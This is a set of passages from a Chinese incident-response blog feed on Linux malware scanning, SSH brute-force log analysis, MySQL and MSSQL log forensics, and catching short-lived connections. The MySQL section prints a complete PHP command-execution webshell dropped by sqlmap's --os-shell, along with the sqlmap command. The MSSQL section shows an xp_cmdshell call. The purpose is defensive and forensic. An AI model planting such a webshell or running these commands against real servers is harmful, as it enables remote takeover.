/root/usrclamav.log</span><br><span class="line">#扫描并杀毒</span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/local/zabbix/sbin</span><br><span class="line">#查看日志发现</span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h4><p>linux版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">河马webshell查杀：http://www.shellpub.com</span><br><span class="line">深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html</span><br></pre></td></tr></table></figure><h4 id="2-4-RPM-check检查"><a href="#2-4-RPM-check检查" class="headerlink" title="2.4 RPM check检查"></a>2.4 RPM check检查</h4><p>​    系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">S         文件大小是否改变</span><br><span class="line">M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">D         设备中，从代码是否改变</span><br><span class="line">L         文件路径是否改变</span><br><span class="line">U         文件的属主（所有者）是否改变</span><br><span class="line">G         文件的属组是否改变</span><br><span class="line">T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure><p>如果命令被替换了，如果还原回来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询ls命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  先把ls转移到tmp目录下，造成ls命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中ls命令到当前目录的/bin/ls下</span><br><span class="line">cp /root/bin/ls  /bin/ 把ls命令复制到/bin/目录 修复文件丢失</span><br></pre></td></tr></table></figure><h4 id="2-5-linux安全检查脚本"><a href="#2-5-linux安全检查脚本" class="headerlink" title="2.5 linux安全检查脚本"></a>2.5 linux安全检查脚本</h4><p>Github项目地址：</p><p><a href="https://github.com/grayddq/GScan" target="_blank" rel="noopener">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check" target="_blank" rel="noopener">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux" target="_blank" rel="noopener">https://github.com/T0xst/linux</a></p><p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第一章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第3章第1篇：SSH暴力破解</title>
      <link href="/2019/10/16/%E7%AC%AC1%E7%AF%87%EF%BC%9ASSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>/2019/10/16/%E7%AC%AC1%E7%AF%87%EF%BC%9ASSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第1篇：SSH暴力破解"><a href="#第1篇：SSH暴力破解" class="headerlink" title="第1篇：SSH暴力破解"></a>第1篇：SSH暴力破解</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，网站管理员登录服务器进行巡检时，发现端口连接里存在两条可疑的连接记录，如下图：</p><p><img src="/images/linux-10-1.png" alt></p><ol><li><p>TCP初始化连接三次握手吧：发SYN包，然后返回SYN/ACK包，再发ACK包，连接正式建立。但是这里有点出入，当请求者收到SYS/ACK包后，就开始建立连接了，而被请求者第三次握手结束后才建立连接。</p></li><li><p>客户端TCP状态迁移：</p><p>​    CLOSED-&gt;SYN_SENT-&gt;ESTABLISHED-&gt;FIN_WAIT_1-&gt;FIN_WAIT_2-&gt;TIME_WAIT-&gt;CLOSED</p><p>服务器TCP状态迁移：</p><p>​    CLOSED-&gt;LISTEN-&gt;SYN recv-&gt;ESTABLISHED-&gt;CLOSE_WAIT-&gt;LAST_ACK-&gt;CLOSED</p></li><li><p>当客户端开始连接时，服务器还处于LISTENING，客户端发一个SYN包后，服务端接收到了客户端的SYN并且发送了ACK时，服务器处于SYN_RECV状态，然后并没有再次收到客户端的ACK进入ESTABLISHED状态，一直停留在SYN_RECV状态。</p><p>在这里，SSH（22）端口，两条外网IP的SYN_RECV状态连接，直觉告诉了管理员，这里一定有什么异常。</p></li></ol><h3 id="0x02-日志分析"><a href="#0x02-日志分析" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p>​    SSH端口异常，我们首先有必要先来了解一下系统账号情况：</p><p><strong>A、系统账号情况</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、除root之外，是否还有其它特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &apos;$3==0&#123;print $1&#125;&apos; /etc/passwd</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">2、可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &apos;/\$1|\$6/&#123;print $1&#125;&apos; /etc/shadow</span><br><span class="line">root:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7:::</span><br></pre></td></tr></table></figure><p>我们可以确认目前系统只有一个管理用户root。</p><p>接下来，我们想到的是/var/log/secure，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。</p><p><strong>B、确认攻击情况：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1、统计了下日志，发现大约有126254次登录失败的记录，确认服务器遭受暴力破解</span><br><span class="line">[root@localhost ~]# grep -o &quot;Failed password&quot; /var/log/secure|uniq -c</span><br><span class="line">     126254 Failed password</span><br><span class="line">     </span><br><span class="line">2、输出登录爆破的第一行和最后一行，确认爆破时间范围：</span><br><span class="line">[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|head -1</span><br><span class="line">Jul  8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2</span><br><span class="line">[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|tail -1</span><br><span class="line">Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2</span><br><span class="line"></span><br><span class="line">3、进一步定位有哪些IP在爆破？</span><br><span class="line">[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c | sort -nr </span><br><span class="line">    12622 23.91.xxx.xxx</span><br><span class="line">     8942 114.104.xxx.xxx</span><br><span class="line">     8122 111.13.xxx.xxx</span><br><span class="line">     7525 123.59.xxx.xxx</span><br><span class="line">     ...................</span><br><span class="line">    </span><br><span class="line">4、爆破用户名字典都有哪些？</span><br><span class="line">[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|perl -e &apos;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&apos;|uniq -c|sort -nr</span><br><span class="line">      9402  root</span><br><span class="line">      3265  invalid user oracle</span><br><span class="line">      1245  invalid user admin</span><br><span class="line">      1025  invalid user user</span><br><span class="line">      .....................</span><br></pre></td></tr></table></figure><p><strong>C、管理员最近登录情况：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、登录成功的日期、用户名、IP：</span><br><span class="line">[root@localhost ~]# grep &quot;Accepted &quot; /var/log/secure | awk &apos;&#123;print $1,$2,$3,$9,$11&#125;&apos; </span><br><span class="line">Jul 9 09:38:09 root 192.168.143.100</span><br><span class="line">Jul 9 14:55:51 root 192.168.143.100</span><br><span class="line">Jul 10 08:54:26 root 192.168.143.100</span><br><span class="line">Jul 10 16:25:59 root 192.168.143.100</span><br><span class="line">............................</span><br><span class="line">通过登录日志分析，并未发现异常登录时间和登录IP。</span><br><span class="line"></span><br><span class="line">2、顺便统计一下登录成功的IP有哪些：</span><br><span class="line">[root@localhost ~]# grep &quot;Accepted &quot; /var/log/secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br><span class="line">     27 192.168.204.1</span><br></pre></td></tr></table></figure><p>通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。</p><h3 id="0x04-处理措施"><a href="#0x04-处理措施" class="headerlink" title="0x04 处理措施"></a>0x04 处理措施</h3><p>​    SSH暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、禁止向公网开放管理端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于8位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line">2、更改服务器ssh默认端口。</span><br><span class="line">3、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第2章第5篇:MySQL日志分析</title>
      <link href="/2019/10/16/%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2019/10/16/%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第5篇-MySQL日志分析"><a href="#第5篇-MySQL日志分析" class="headerlink" title="第5篇:MySQL日志分析"></a>第5篇:MySQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p><h3 id="0x01-Mysql日志分析"><a href="#0x01-Mysql日志分析" class="headerlink" title="0x01 Mysql日志分析"></a>0x01 Mysql日志分析</h3><p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、查看log配置信息</span><br><span class="line">show variables like &apos;%general%&apos;;</span><br><span class="line">2、开启日志</span><br><span class="line">SET GLOBAL general_log = &apos;On&apos;;</span><br><span class="line">3、指定日志文件路径</span><br><span class="line">#SET GLOBAL general_log_file = &apos;/var/lib/mysql/mysql.log&apos;;</span><br></pre></td></tr></table></figure><p>比如，当我访问 /test.php?id=1，此时我们得到这样的日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">190604 14:46:14       14 Connect    root@localhost on </span><br><span class="line">           14 Init DB    test</span><br><span class="line">           14 Query    SELECT * FROM admin WHERE id = 1</span><br><span class="line">           14 Quit  `</span><br></pre></td></tr></table></figure><p>我们按列来解析一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。</span><br><span class="line">第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。</span><br><span class="line">第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。</span><br><span class="line">第四列:Argument，详细信息，例如 Connect    root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。</span><br></pre></td></tr></table></figure><h3 id="0x02-登录成功-失败"><a href="#0x02-登录成功-失败" class="headerlink" title="0x02 登录成功/失败"></a>0x02 登录成功/失败</h3><p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。</p><p><img src="/images/log-5-1.png" alt></p><p>MySQL中的log记录是这样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Time                 Id        Command         Argument</span><br><span class="line"></span><br><span class="line">190601 22:03:20   98 Connectroot@192.168.204.1 on </span><br><span class="line">   98 ConnectAccess denied for user &apos;root&apos;@&apos;192.168.204.1&apos; (using password: YES)</span><br><span class="line">  103 Connectmysql@192.168.204.1 on </span><br><span class="line">  103 ConnectAccess denied for user &apos;mysql&apos;@&apos;192.168.204.1&apos; (using password: YES)</span><br><span class="line">  104 Connectmysql@192.168.204.1 on </span><br><span class="line">  104 ConnectAccess denied for user &apos;mysql&apos;@&apos;192.168.204.1&apos; (using password: YES)</span><br><span class="line">  100 Connectroot@192.168.204.1 on </span><br><span class="line">  101 Connectroot@192.168.204.1 on </span><br><span class="line">  101 ConnectAccess denied for user &apos;root&apos;@&apos;192.168.204.1&apos; (using password: YES)</span><br><span class="line">   99 Connectroot@192.168.204.1 on </span><br><span class="line">   99 ConnectAccess denied for user &apos;root&apos;@&apos;192.168.204.1&apos; (using password: YES)</span><br><span class="line">  105 Connectmysql@192.168.204.1 on </span><br><span class="line">  105 ConnectAccess denied for user &apos;mysql&apos;@&apos;192.168.204.1&apos; (using password: YES)</span><br><span class="line">  100 Queryset autocommit=0</span><br><span class="line">  102 Connectmysql@192.168.204.1 on </span><br><span class="line">  102 ConnectAccess denied for user &apos;mysql&apos;@&apos;192.168.204.1&apos; (using password: YES)</span><br><span class="line">  100 Quit`</span><br></pre></td></tr></table></figure><p>你知道在这个口令猜解过程中，哪个是成功的吗？</p><p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">190601 22:03:20     100 Connectroot@192.168.204.1 on </span><br><span class="line">   100 Queryset autocommit=0</span><br><span class="line">   100 Quit</span><br></pre></td></tr></table></figure><p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p><p>Navicat for MySQL登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">190601 22:14:07  106 Connectroot@192.168.204.1 on </span><br><span class="line">         106 QuerySET NAMES utf8</span><br><span class="line">         106 QuerySHOW VARIABLES LIKE &apos;lower_case_%&apos;</span><br><span class="line">         106 QuerySHOW VARIABLES LIKE &apos;profiling&apos;</span><br><span class="line">         106 QuerySHOW DATABASES</span><br></pre></td></tr></table></figure><p>命令行登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">190601 22:17:25  111 Connectroot@localhost on </span><br><span class="line">         111 Queryselect @@version_comment limit 1</span><br><span class="line">190601 22:17:56  111 Quit</span><br></pre></td></tr></table></figure><p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p><p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p><p>登录失败的记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">102 Connectmysql@192.168.204.1 on </span><br><span class="line">102 ConnectAccess denied for user &apos;mysql&apos;@&apos;192.168.204.1&apos; (using password: YES)</span><br></pre></td></tr></table></figure><p>利用shell命令进行简单的分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#有哪些IP在爆破？</span><br><span class="line">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&apos;&quot; -f4|uniq -c|sort -nr</span><br><span class="line">     27 192.168.204.1</span><br><span class="line"></span><br><span class="line">#爆破用户名字典都有哪些？</span><br><span class="line">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&apos;&quot; -f2|uniq -c|sort -nr</span><br><span class="line">     13 mysql</span><br><span class="line">     12 root</span><br><span class="line">      1 root</span><br><span class="line">      1 mysql</span><br></pre></td></tr></table></figure><p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p><p>敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func</p><h3 id="0x03-SQL注入入侵痕迹"><a href="#0x03-SQL注入入侵痕迹" class="headerlink" title="0x03  SQL注入入侵痕迹"></a>0x03  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p><p>1、构造一个SQL注入点，开启Burp监听8080端口</p><p><code>sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p><p>HTTP通讯过程如下：</p><p><img src="/images/log-5-3.png" alt></p><p>创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p><p>tmpbwyov.php：</p><?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?><p>`</p><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p><p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p><p>检查方法：</p><p>1、检查网站目录下，是否存在一些木马文件：</p><p><img src="/images/log-5-4.png" alt></p><p>2、检查是否有UDF提权、MOF提权痕迹</p><p>检查目录是否有异常文件</p><p>mysql\lib\plugin </p><p>c:/windows/system32/wbem/mof/</p><p>检查函数是否删除</p><p><code>select * from mysql.func</code></p><p>3、结合web日志分析。</p>]]></content>
      
      
      <categories>
          
          <category> 日志分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第二章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第2章第4篇:MSSQL日志分析</title>
      <link href="/2019/10/16/%E7%AC%AC4%E7%AF%87%EF%BC%9AMSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2019/10/16/%E7%AC%AC4%E7%AF%87%EF%BC%9AMSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第4篇-MSSQL日志分析"><a href="#第4篇-MSSQL日志分析" class="headerlink" title="第4篇:MSSQL日志分析"></a>第4篇:MSSQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p><h3 id="0x01-MSSQL日志分析"><a href="#0x01-MSSQL日志分析" class="headerlink" title="0x01 MSSQL日志分析"></a>0x01 MSSQL日志分析</h3><p>首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。</p><p><img src="/images/log-4-3.png" alt></p><p>登录到SQL Server Management Studio，依次点击 管理–SQL Server 日志</p><p><img src="/images/log-4-4.png" alt></p><p>双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。</p><p><img src="/images/log-4-5.png" alt></p><p>另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。</p><p><img src="/images/log-4-6.png" alt></p><p>日志分析案例：</p><p>在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。</p><p><img src="/images/log-4-7.png" alt></p><p>筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。</p><p>如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。</p><p><img src="/images/log-4-8.png" alt></p><h3 id="0x02-SQL注入入侵痕迹"><a href="#0x02-SQL注入入侵痕迹" class="headerlink" title="0x02  SQL注入入侵痕迹"></a>0x02  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p><p>1、构造一个SQL注入点，开启Burp监听8080端口</p><p><code>sqlmap.py  -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p><p>HTTP通讯过程如下：</p><p><img src="/images/log-4-1.png" alt></p><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p><p>通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。</p><p>检查方法：</p><p>1、数据库表检查</p><p><img src="/images/log-4-2.png" alt></p><p>2、检查xp_cmdshell等存储过程</p><p>xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。</p><p>`Exec master.dbo.xp_cmdshell ‘whoami’</p><p>3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。</p>]]></content>
      
      
      <categories>
          
          <category> 日志分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第二章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第3章第2篇：捕捉短连接</title>
      <link href="/2019/10/16/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E6%8D%95%E6%8D%89%E7%9F%AD%E8%BF%9E%E6%8E%A5/"/>
      <url>/2019/10/16/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E6%8D%95%E6%8D%89%E7%9F%AD%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第2篇：捕捉短连接"><a href="#第2篇：捕捉短连接" class="headerlink" title="第2篇：捕捉短连接"></a>第2篇：捕捉短连接</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，网络管理员在出口WAF检测到某台服务器不断向香港I发起请求 ，感觉很奇怪，登录服务器排查，想要找到发起短连接的进程。</p><h3 id="0x02-日志分析"><a href="#0x02-日志分析" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p>​    登录服务器查看端口、进程，并未发现发现服务器异常，但是当多次刷新端口连接时，可以查看该连接。 有时候一直刷这条命令好十几次才会出现，像这种的短连接极难捕捉到对应的进程和源文件。 </p><p><img src="/images/linux-11-1.png" alt></p><p>手动捕捉估计没戏，很难追踪，于是动手写了一段小脚本来捕捉短连接对应的pid和源文件。</p><p>脚本文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">ip=118.184.15.40</span><br><span class="line">i=1</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">   tmp=netstat -anplt|grep $ip|awk -F &apos;[/]&apos; &apos;&#123;print $1&#125;&apos;|awk &apos;&#123;print $7&#125;&apos;</span><br><span class="line">   #echo $tmp</span><br><span class="line">   if test -z &quot;$tmp&quot;</span><br><span class="line">   then</span><br><span class="line">       ((i=i+1)) </span><br><span class="line">   else</span><br><span class="line">       for pid in $tmp; do</span><br><span class="line">           echo &quot;PID: &quot;$&#123;pid&#125;</span><br><span class="line">          result=ls -lh /proc/$pid|grep exe</span><br><span class="line">          echo &quot;Process: &quot;$&#123;result&#125;</span><br><span class="line">          kill -9 $pid</span><br><span class="line">       done</span><br><span class="line">       break</span><br><span class="line">   fi </span><br><span class="line">done</span><br><span class="line">echo &quot;Total number of times: &quot;$&#123;i&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下： </p><p><img src="/images/linux-11-2.png" 